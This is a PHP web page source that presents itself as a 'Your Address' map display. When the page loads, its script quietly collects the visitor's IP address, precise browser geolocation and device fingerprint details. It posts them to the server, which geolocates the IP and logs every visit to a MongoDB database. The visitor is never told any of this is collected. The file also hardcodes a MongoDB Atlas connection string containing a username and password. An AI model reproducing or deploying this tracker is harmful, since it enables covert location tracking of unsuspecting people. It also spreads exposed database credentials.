<?php
// ------------------
// Error reporting
// ------------------
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ------------------
// MongoDB Atlas connection
// ------------------
$mongoClient = null;
$mongoError = null;

try {
    // Connect to MongoDB Atlas (@ symbol in password must be URL-encoded as %40)
    $mongoClient = new MongoDB\Driver\Manager("mongodb+srv://shashwats500:Ravi%401234@cluster0.7li4oxi.mongodb.net/?appName=Cluster0");
    
    // Test connection
    $command = new MongoDB\Driver\Command(['ping' => 1]);
    $mongoClient->executeCommand('admin', $command);
    
    $dbName = "deviceinfo";
    $collectionName = "device_logs";
    
} catch (Exception $e) {
    $mongoError = $e->getMessage();
    error_log("MongoDB connection failed: " . $mongoError);
    $mongoClient = null;
}

// ------------------
// Save AJAX POST request
// ------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['latitude']) && isset($_POST['longitude'])) {
    
    // Check if MongoDB is connected
    if (!$mongoClient) {
        echo json_encode(['success' => false, 'error' => 'MongoDB not connected', 'details' => $mongoError]);
        exit;
    }
    
    $ip       = $_POST['ip'] ?? $_SERVER['REMOTE_ADDR'];
    $lat      = $_POST['latitude'];
    $lon      = $_POST['longitude'];
    $browser  = $_POST['browser'] ?? $_SERVER['HTTP_USER_AGENT'];
    $platform = $_POST['platform'] ?? '';
    $screen   = $_POST['screen'] ?? '';
    $language = $_POST['language'] ?? '';
    $memory   = $_POST['memory'] ?? '';
    $cores    = (int)($_POST['cores'] ?? 0);

    $country = "Unknown";
    $city    = "Unknown";
    if (!empty($ip)) {
        $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
        if ($geo && $geo->status === "success") {
            $country = $geo->country;
            $city = $geo->city;
        }
    }

    try {
        // Insert new document for every visit
        $document = [
            'ip' => $ip,
            'country' => $country,
            'city' => $city,
            'latitude' => (float)$lat,
            'longitude' => (float)$lon,
            'browser' => $browser,
            'platform' => $platform,
            'screen' => $screen,
            'language' => $language,
            'memory' => $memory,
            'cores' => $cores,
            'visited_at' => new MongoDB\BSON\UTCDateTime()
        ];

        $bulk = new MongoDB\Driver\BulkWrite;
        $bulk->insert($document);
        $result = $mongoClient->executeBulkWrite('deviceinfo.device_logs', $bulk);
        
        echo json_encode([
            'success' => true, 
            'message' => 'Visit logged', 
            'insertedCount' => $result->getInsertedCount(),
            'timestamp' => date('Y-m-d H:i:s')
        ]);
    } catch (Exception $e) {
        error_log("MongoDB insert failed: " . $e->getMessage());
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// ------------------
// Default location for preview
// ------------------
$defaultAddress = "H73C+QFX Kokernag-verinag road, Forest Block, 192212";
$defaultLat = "33.738";
$defaultLon = "75.117";
?>
<!DOCTYPE html>
<html>
<head>
    <title>Device/Location Info</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <style>
        body { font-family: Arial; background: #f4f4f9; text-align:center; padding:50px; }
        h1 { color:#2c3e50; font-size:2.5em; margin-bottom:20px; }
        #map { width:80%; height:400px; margin:30px auto; border-radius:10px; border:2px solid #16a085; }
        input { padding:10px; font-size:1em; width:400px; margin-top:20px; border:1px solid #ccc; border-radius:5px; text-align:left; color:#000; background:#fff; }
    </style>
</head>
<body>
    <h1>Your Address:</h1>
    <input type="text" value="<?php echo $defaultAddress; ?>" readonly>

    <div id="map">
        <iframe 
            width="100%" height="100%" style="border:0;" loading="lazy" allowfullscreen
            src="https://www.google.com/maps?q=<?php echo $defaultLat; ?>,<?php echo $defaultLon; ?>&output=embed">
        </iframe>
    </div>

<script>
window.onload = function() {
    const data = {
        latitude: '<?php echo $defaultLat; ?>',
        longitude: '<?php echo $defaultLon; ?>',
        ip: '',
        browser: navigator.userAgent,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        memory: navigator.deviceMemory || 'Unknown',
        cores: navigator.hardwareConcurrency || 0
    };

    // Get IP
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(res => {
            data.ip = res.ip;

            // Get geolocation if allowed
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.latitude = pos.coords.latitude;
                        data.longitude = pos.coords.longitude;
                        sendData();
                    },
                    () => sendData() // fallback if user denies
                );
            } else {
                sendData();
            }
        }).catch(() => sendData());

    function sendData() {
        $.ajax({
            url: '',
            method: 'POST',
            data: data,
            success: function(res) { 
                console.log('Response:', res); 
                try {
                    const result = JSON.parse(res);
                    console.log('Parsed result:', result);
                    if (result.error) {
                        console.error('Error:', result.error);
                    }
                } catch (e) {
                    console.log('Raw response:', res);
                }
            },
            error: function(err) { console.error('AJAX error:', err); }
        });
    }
};
</script>
</body>
</html>
